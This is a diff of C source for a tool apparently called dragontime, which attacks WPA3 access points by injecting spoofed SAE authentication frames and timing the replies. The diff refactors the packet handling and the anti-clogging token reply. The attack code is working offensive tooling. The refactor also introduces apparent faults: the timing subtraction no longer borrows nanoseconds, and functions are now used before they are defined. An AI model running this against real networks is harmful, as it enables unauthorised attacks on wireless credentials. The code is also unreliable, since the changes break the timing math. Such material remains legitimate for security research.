@@ -1,5 +1,4 @@
 #include <err.h>
-#include <signal.h>
 #include <poll.h>
 #include <assert.h>
 #include <stdio.h>
@@ -12,18 +11,8 @@
 #include "dragontime.h"
 #include "utils.h"
 
-static struct state *get_state(void) { return &_state; }
-
-static void card_open(struct state *state, char *dev) {
-	printf("Opening card %s\n", dev);
-	if ((state->wi = wi_open(dev)) == NULL)
-		err(1, "wi_open()");
-	if (wi_set_channel(state->wi, 1) == -1)
-		err(1, "card_set_chan()");
-}
-
-static int card_write(const struct state *state, void *buf, const int len) {
-	return wi_write(state->wi, NULL, 0, buf, len, NULL);
+static struct state *get_state(void) {
+	return &_state;
 }
 
 static int get_group(const int group_id, unsigned char *buf) {
@@ -48,6 +37,57 @@ static int get_group(const int group_id, unsigned char *buf) {
 	}
 
 	memcpy(buf, group, len);
+	return len;
+}
+
+void send_anti_clogging(struct state *state, const unsigned char *buf, const int len) {
+	const unsigned char *token = buf + 24 + 8;
+	const int token_len = len - 24 - 8;
+	unsigned char reply[2048] = {0};
+	int reply_len = 0;
+
+	/* fill in basic frame */
+	reply_len = get_group(state->group, reply);
+
+	/* token comes after status and group id, before scalar and element */
+	const int pos = 24 + 8;
+	memmove(reply + pos + token_len, reply + pos, reply_len - pos);
+	memcpy(reply + pos, token, token_len);
+	reply_len += token_len;
+
+	/* set addresses */
+	memcpy(reply + 4, state->bssid, 6);
+	memcpy(reply + 10, buf + 4, 6);
+	memcpy(reply + 16, state->bssid, 6);
+
+	if (card_write(state, reply, reply_len) == -1)
+		perror("card_write");
+	clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
+}
+
+static void card_open(struct state *state, char *dev) {
+	printf("Opening card %s\n", dev);
+	if ((state->wi = wi_open(dev)) == NULL)
+		err(1, "wi_open()");
+	if (wi_set_channel(state->wi, 1) == -1)
+		err(1, "card_set_chan()");
+}
+
+static int card_write(const struct state *state, void *buf, const int len) {
+	return wi_write(state->wi, NULL, 0, buf, len, NULL);
+}
+
+static int card_receive(struct state *state) {
+	unsigned char buf[2048];
+	int len;
+	struct rx_info ri;
+
+	if ((len = wi_read(state->wi, NULL, 0, buf, sizeof(buf), &ri)) < 0) {
+		fprintf(stderr, "Failed to read packet\n");
+		return -1;
+	}
+
+	process_packet(state, buf, len);
 	return len;
 }
 
@@ -88,65 +128,32 @@ static void queue_next_commit(const struct state *state) {
 }
 
 static void process_packet(struct state *state, const unsigned char *buf, const int len) {
-	int pos_bssid, pos_src;
-
 	/* Ignore retransmitted frames */
-	if (buf[1] & 0x08) return;
-
-	/* Extract addresses */
-	switch (buf[1] & 3) {
-		case 0:
-			pos_bssid = 16;
-			pos_src = 10;
-			break;
-		case 1:
-			pos_bssid = 4;
-			pos_src = 10;
-			break;
-		case 2:
-			pos_bssid = 10;
-			pos_src = 16;
-			break;
-		default:
-			pos_bssid = 10;
-			pos_src = 24;
-			break;
-	}
+	if (is_retransmitted(buf)) return;
 
 	/* Sent by AP */
-	if (memcmp(buf + pos_bssid, state->bssid, 6) != 0
-	    || memcmp(buf + pos_src, state->bssid, 6) != 0)
+	if (memcmp(get_bssid_from_packet(buf), state->bssid, 6) != 0 ||
+	    memcmp(get_src_from_packet(buf), state->bssid, 6) != 0)
 		return;
 
-	/* Detect Beacon - Inject commit frames every second */
-	if (buf[0] == 0x80 && !state->started_attack) {
-		time_t t = time(NULL);
-		struct tm tm = *localtime(&t);
-
-		printf("Detected AP! Starting timing attack at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
-		       tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
-		fprintf(state->fp, "Starting at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
-		        tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
+	/* Start Timing Attack */
+	if (is_beacon(buf) && !state->started_attack) {
+		printf("Detected AP! Starting timing attack\n");
+		fprintf(state->fp, "Starting\n");
 
 		state->started_attack = 1;
 		inject_sae_commit(state);
 	}
-	/* Detect Authentication frames */
-	else if (len >= 24 + 8 &&
-	         buf[0] == 0xb0 && /* Type is Authentication */
-	         buf[24] == 0x03 /* Auth type is SAE */) {
-		/* Check if status is good and it's the first reply */
-		if (buf[28] == 0x00) {
-			struct timespec curr, diff;
 
+	/* Detect Authentication frames */
+	if (is_authentication(buf, len)) {
+		/* Status is good */
+		if (is_status_ok(buf)) {
+			struct timespec curr, diff;
 			clock_gettime(CLOCK_MONOTONIC, &curr);
-			if (curr.tv_nsec > state->prev_commit.tv_nsec) {
-				diff.tv_nsec = curr.tv_nsec - state->prev_commit.tv_nsec;
-				diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec;
-			} else {
-				diff.tv_nsec = 1000000000 + curr.tv_nsec - state->prev_commit.tv_nsec;
-				diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec - 1;
-			}
+
+			diff.tv_nsec = curr.tv_nsec - state->prev_commit.tv_nsec;
+			diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec;
 
 			state->sum_time[state->curraddr] += diff.tv_nsec;
 			state->num_injected[state->curraddr] += 1;
@@ -169,54 +176,22 @@ static void process_packet(struct state *state, const unsigned char *buf, const 
 			state->srcaddr[5] = state->curraddr;
 			queue_next_commit(state);
 		}
+
 		/* Status equals Anti-Clogging Token Required */
-		else if (buf[28] == 0x4C) {
-			const unsigned char *token = buf + 24 + 8;
-			const int token_len = len - 24 - 8;
-			unsigned char reply[2048] = {0};
-			int reply_len = 0;
-
-			/* fill in basic frame */
-			reply_len = get_group(state->group, reply);
-
-			/* token comes after status and group id, before scalar and element */
-			int pos = 24 + 8;
-			memmove(reply + pos + token_len, reply + pos, reply_len - pos);
-			memcpy(reply + pos, token, token_len);
-			reply_len += token_len;
-
-			/* set addresses */
-			memcpy(reply + 4, state->bssid, 6);
-			memcpy(reply + 10, buf + 4, 6);
-			memcpy(reply + 16, state->bssid, 6);
-
-			if (card_write(state, reply, reply_len) == -1)
-				perror("card_write");
-			clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
+		else if (is_status_clogged(buf)) {
+			send_anti_clogging(state, buf, len);
 		}
 
 		/* Status equals unsupported group */
-		else if (buf[28] == 0x4d) {
+		else if (is_status_unsupported(buf)) {
 			printf("WARNING: Authentication rejected due to unsupported group\n");
-		} else {
+		}
+
+		/* Unrecognized */
+		else {
 			printf("WARNING: Unrecognized status 0x%02X 0x%02X\n", buf[28], buf[29]);
 		}
 	}
-}
-
-static int card_receive(struct state *state) {
-	unsigned char buf[2048];
-	int len;
-	struct rx_info ri;
-
-	if ((len = wi_read(state->wi, NULL, 0, buf, sizeof(buf), &ri)) < 0) {
-		fprintf(stderr, "Failed to read packet\n");
-		return -1;
-	}
-
-	process_packet(state, buf, len);
-
-	return len;
 }
 
 static void check_timeout(const struct state *state) {
@@ -289,7 +264,7 @@ static void event_loop(struct state *state, char *dev) {
 	// 6. Now start the main event loop
 	printf("Searching for AP ...\n");
 	while (1) {
-		int card_fd = wi_fd(state->wi);
+		const int card_fd = wi_fd(state->wi);
 
 		memset(&fds, 0, sizeof(fds));
 		fds[0].fd = card_fd;
@@ -372,7 +347,7 @@ int main(const int argc, char *argv[]) {
 				break;
 
 			case 'a':
-				if (getmac(optarg, 1, state->bssid) != 0) {
+				if (get_mac(optarg, 1, state->bssid) != 0) {
 					printf("Invalid AP MAC address.\n");
 					return 1;
 				}
